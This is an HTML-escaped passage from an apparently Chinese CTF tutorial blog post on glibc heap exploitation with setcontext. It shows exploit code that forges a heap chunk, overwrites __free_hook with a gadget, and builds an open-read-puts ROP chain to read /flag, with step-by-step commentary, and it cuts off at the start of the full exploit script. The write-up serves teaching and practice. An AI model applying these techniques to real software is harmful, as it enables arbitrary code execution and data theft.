class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;   # 获取下面那一块usbin，这样的话 0 1 9 都是bb20了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;name_edit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x380&lt;/span&gt;)[:&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;])&lt;/span&gt; # 要伪造的堆块的地址，也可以选其他的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x111&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x3a8&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x18&lt;/span&gt;) # 在chunk2的gender字段放置地址addr，令addr+&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;指向chunk2的des字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(setcontext)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= (&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;-len(pl))*&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt; + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x5d0&lt;/span&gt;) + p64(p_rdi_r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content_edit(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,pl)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;content_edit(9,pl) 这里就覆盖了之前的堆块了，至于为啥要写入390位置，因为要把这里当作头，然后3a0作为内容地址，这样就可以edit写入了，edit写入的其实是伪造了一个完整的堆块&lt;/p&gt;
&lt;h2 id=&#34;3-修改free-hook为-特殊-gadget&#34;&gt;&lt;a href=&#34;#3-修改free-hook为-特殊-gadget&#34; class=&#34;headerlink&#34; title=&#34;3. 修改free_hook为 特殊 gadget&#34;&gt;&lt;/a&gt;3. 修改free_hook为 特殊 gadget&lt;/h2&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130182319582.png&#34; alt=&#34;image-20240130182319582&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​	为什么要free7呢?	free(7)应该是为了绕过检测、  反正必须要free一个，应该会有计数检测， free个没有影响的就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ----------------------------------------------- &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; gadget into free_hook&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;pause&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;name_edit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(free_hook)[:&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;8888&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,p64(gadget)[:&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;4-布置ORW-rop链&#34;&gt;&lt;a href=&#34;#4-布置ORW-rop链&#34; class=&#34;headerlink&#34; title=&#34;4. 布置ORW rop链&#34;&gt;&lt;/a&gt;4. 布置ORW rop链&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ---------------------------------------------- &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; 在堆块中布置rop链&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0xb10&lt;/span&gt;) + p64(p_rsi_r) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(open_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 这里要注意选择open返回的fd指针&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(p_rdi_r) + p64(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p64(p_rsi_r) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;) + p64(p_rdx_r12_r) + p64(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(read_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(p_rdi_r) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;) + p64(&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content_edit(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,pl)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name_edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;/flag\x00\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		这里红框的地址，指向flag字符串， 这里也是后面rop的起点，pop rdi的下一个位置，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130161913075.png&#34; alt=&#34;image-20240130161913075&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-free触发&#34;&gt;&lt;a href=&#34;#5-free触发&#34; class=&#34;headerlink&#34; title=&#34;5. free触发&#34;&gt;&lt;/a&gt;5. free触发&lt;/h2&gt;&lt;p&gt;​	在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 free(2)，把这个参数传给特殊gadget，然后执行&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov rdx, qword ptr [rdi + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	所以就是把b3b0+8处的值传给rdx，也就是b3a0，然后把b3a0+0x20处的值，当作函数的地址，也就是b3c0，也就是setcontext&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240127194412645-6610301.png&#34; alt=&#34;image-20240127194412645&#34;&gt;&lt;/p&gt;
&lt;p&gt;setcontext &amp;#x3D; base + sym(‘setcontext’) + 61&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123165326724-6610301.png&#34; alt=&#34;image-20240123165326724&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123165757086-6610301.png&#34; alt=&#34;image-20240123165757086&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	通过这个来设置寄存器的值，主要是通过rdx+ 0xa0 设置了rsp,	ret的时候跳到后面rop那里，开始rop&lt;/p&gt;
&lt;p&gt;​	rdx + 0xa8位置设置 pop rdi；ret; 这里的话，会被放到rcx，然后push rcx，所以这么布置&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130152108965.png&#34; alt=&#34;image-20240130152108965&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里其实设置哪个chunk都可以，只要找好对应关系就可以了&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#coding=utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#__author__:N1K0_&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; inspect&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; sys &lt;span 